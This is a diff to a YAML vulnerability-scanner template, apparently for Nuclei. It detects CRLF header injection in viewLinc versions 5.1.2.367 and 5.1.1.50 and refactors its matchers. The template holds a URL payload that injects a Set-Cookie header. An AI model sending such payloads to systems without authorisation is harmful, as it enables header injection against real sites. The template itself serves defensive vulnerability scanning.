@@ -4,21 +4,27 @@ info:
   name: viewLinc viewLinc/5.1.2.367 (and sometimes 5.1.1.50) is vulnerable to CRLF Injection.
   author: geeknik
   severity: low
+  description: The viewLinc application allows remote attackers to inject a CRLF character into the responses returned by the product, this allows attackers to inject arbitrary HTTP headers into the response returned.
   reference: https://www.vaisala.com/en/products/systems/indoor-monitoring-systems/viewlinc-continuous-monitoring-system
   tags: crlf,viewlinc
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
 
-    matchers-condition: and
+    matchers-condition: or
     matchers:
-      - type: regex
-        part: header
-        regex:
-          - '(?i)Server:\s*viewLinc/(5\.1\.2\.367|5\.1\.1\.50)'
       - type: word
         words:
+          - "Server: viewLinc/5.1.2.367"
           - "Set-Cookie: crlfinjection=crlfinjection"
         part: header
+        condition: and
+
+      - type: word
+        words:
+          - "Server: viewLinc/5.1.1.50"
+          - "Set-Cookie: crlfinjection=crlfinjection"
+        part: header
+        condition: and
